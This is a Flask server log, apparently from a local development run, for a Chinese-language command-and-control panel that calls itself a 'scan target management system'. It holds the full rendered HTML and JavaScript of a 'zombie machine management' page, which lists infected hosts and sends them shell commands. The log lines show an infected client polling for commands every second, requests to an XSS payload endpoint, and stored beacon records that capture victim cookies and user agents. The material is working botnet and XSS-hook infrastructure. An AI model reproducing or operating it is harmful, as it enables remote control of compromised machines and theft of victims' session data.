event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:19:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:39] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:19:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:39] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:19:39 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:39] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:19:40 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:40 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:40 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:40] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:41 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:42 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:42] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:43 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:43 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:43 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:43 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:43] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:44 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:44 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:44 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:44 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:44] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:45 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:45 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:45 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:46 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:47 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:47 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:47 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:47] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:48 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:50 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:51 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:52 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:53 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:53 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:53 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:53 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:53] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:54 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:55 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:55 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:55 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:55 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:55] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:56 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:57 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:57 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:57 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:57 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:57] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:19:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:19:58 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:19:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:19:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:19:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:03 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 23:20:03 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 23:20:03 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> victim-browser</p>\n            <p><strong>目標配置:</strong> XSS_GET_signal</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:16:45.339064</p>\n        </div>\n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T15:19:27.951Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-24 23:19:27.955085</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 23:20:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:03] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 23:20:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:03] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-24 23:20:03 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:03] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-24 23:20:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-24 23:20:24 | INFO     | control_route.py:125 | xss_payload() | 用戶請求XSS載荷文件
2025-06-24 23:20:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-24 23:20:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:24] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-24 23:20:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 23:20:24 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 23:20:24 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T15:20:24.833Z"}', None, '2025-06-24 23:20:24.836435', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 23:20:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 23:20:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:24] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 23:20:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:25 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:27 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-24 23:20:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 23:20:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-24 23:20:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-24 23:20:29 | INFO     | control_route.py:154 | get_command() | 肉雞請求獲取命令
2025-06-24 23:20:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
